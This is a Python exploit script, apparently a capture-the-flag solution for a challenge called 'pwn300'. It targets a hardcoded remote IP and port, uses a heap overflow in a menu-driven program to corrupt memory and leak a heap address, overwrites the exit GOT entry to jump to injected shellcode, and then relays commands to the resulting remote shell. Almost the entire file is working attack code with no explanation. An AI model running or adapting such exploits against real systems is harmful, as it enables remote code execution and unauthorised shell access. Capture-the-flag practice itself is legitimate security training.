from zio import *
from time import sleep
from pwn import *
#target = './pwn300_aa508d1df74d46a88bc02210c7f92824'
target = ('133.130.90.210',6666)
#target = ('127.0.0.1',6667)
io = zio(target,print_read=COLORED(RAW,'red'),print_write=COLORED(RAW,'green') )

def add_girl(girl_type):
    io.read_until('Choice:')
    io.writeline('1')
    io.read_until('Girl:')
    io.writeline(girl_type)

def edit_girl(girl_id,girl_type,data):
    io.read_until('Choice:')
    io.writeline('3')
    io.read_until(':')
    io.writeline(girl_id)
    io.read_until(':')
    io.writeline(girl_type)
    io.read_until(':')
    io.writeline(data)

def del_girl(girl_id):
    io.read_until('Choice:')
    io.writeline('2')
    io.read_until(':')
    io.writeline(girl_id)

def show_girl(girl_id):
    io.read_until('Choice:')
    io.writeline('4')
    io.read_until(':')
    io.writeline(girl_id)

def exit_pro():
    io.read_until('Choice:')
    io.writeline('5')

shellcode = asm(shellcraft.sh())
#io.gdb_hint()
add_girl('0')
add_girl('0')
add_girl('0')
add_girl('0')

payload1 = "a"*0x74 + l32(0x0804b060) + l32(0x0804b068-4)
edit_girl('2','1',payload1)
sleep(0.5)
del_girl('3')
sleep(0.5)
show_girl('2')
io.read(1)
heap_addr = l32(io.read(4))
print("heap_addr = %x"%(heap_addr))

#got_exit = 0x0804b01c
# addr2 = addr - 4 ;   [addr2] = addr1,  
# [addr2-4] = addr1 
sleep(0.5)
shellcode1 = "\xeb\x10" + "\x90"*0x20 + shellcode  

payload2 = shellcode1 + (0x74-len(shellcode1))*"\x90"  + l32(heap_addr-0x80) + l32(0x0804b01c-4)
edit_girl('0','1',payload2)
del_girl('1')
exit_pro()

while(True):
    cmd = raw_input()
    io.writeline(cmd)
    print io.readlines()
'''
io.writeline("id")
io.interact()
'''



